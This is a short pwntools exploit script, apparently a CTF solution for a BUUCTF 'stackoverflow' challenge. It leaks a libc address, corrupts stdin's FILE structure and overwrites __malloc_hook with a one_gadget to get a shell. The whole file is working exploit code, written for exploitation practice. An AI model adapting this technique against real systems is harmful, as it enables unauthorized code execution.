#coding:utf8
from pwn import *
 
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#sh = process('./stackoverflow')
sh = remote('node3.buuoj.cn',25201)
sh.sendafter('leave your name, bro:','a'*0x20)
sh.recvuntil('a'*0x20)
libc_base = u64(sh.recv(6).ljust(8,'\x00')) - libc.sym['_IO_2_1_stdout_']
one_gadget_addr = libc_base + 0xf1147
malloc_hook_addr = libc_base + libc.sym['__malloc_hook']
print 'libc_base=',hex(libc_base)
print 'one_gadget_addr=',hex(one_gadget_addr)
print 'malloc_hook_addr=',hex(malloc_hook_addr)
#覆盖stdin的_IO_write_ptr的低1字节为0
sh.sendlineafter('please input the size to trigger stackoverflow:',str(0x6C5908))
sh.sendlineafter('please input the size to trigger stackoverflow:',str(0x300000))
raw_input()
sh.sendlineafter('padding and ropchain:','keer')
sh.sendafter('please input the size to trigger stackoverflow:',p64(malloc_hook_addr)*2 + p64(malloc_hook_addr + 0x8) + p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8))
sh.sendlineafter('padding and ropchain:','keer')
for i in range(39):
   sh.sendlineafter('please input the size to trigger stackoverflow:',str('1'))
#写malloc_hook
sh.sendlineafter('please input the size to trigger stackoverflow:',p64(one_gadget_addr))
 
sh.interactive()